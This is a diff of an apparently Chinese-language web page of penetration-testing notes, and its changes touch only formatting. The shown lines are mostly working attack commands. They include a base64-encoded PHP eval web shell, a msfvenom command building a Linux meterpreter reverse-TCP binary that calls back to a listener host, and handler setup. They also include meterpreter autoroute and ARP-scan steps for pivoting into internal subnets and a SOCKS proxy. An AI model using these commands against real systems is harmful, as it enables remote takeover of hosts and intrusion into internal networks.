@@ -75,7 +75,7 @@
 <p>xxxxx = PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=</p>
 <p>msf生成木马</p>
 <p>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.175.128  LPORT=6666</p>
-<p>**SessionCommunicationTimeout=0 SessionExpirationTimeout=0 **-f elf  &gt; shell.elf</p>
+<p>**SessionCommunicationTimeout=0 SessionExpirationTimeout=0 ** -f elf  &gt; shell.elf</p>
 <p>开启监听</p>
 <p>msfconsole </p>
 <p>use exploit/multi/handler</p>
@@ -88,7 +88,7 @@
 <p>chomd 777 shell.elf 执行上线</p>
 <p><strong>配置路由</strong></p>
 <p>meterpreter &gt; run get_local_subnets //获取网段<br>meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由<br>meterpreter &gt; run autoroute -p //查看路由<br>meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段<br>meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。<br>meterpreter &gt; background //后台sessions</p>
-<p><strong>内网代理</strong>？</p>
+<p><strong>内网代理</strong></p>
 <p>socks（可以search socks 查看相关语法）</p>
 <p>use auxiliary/server/socks_proxy</p>
 <p>show options -set VERSION 4</p>
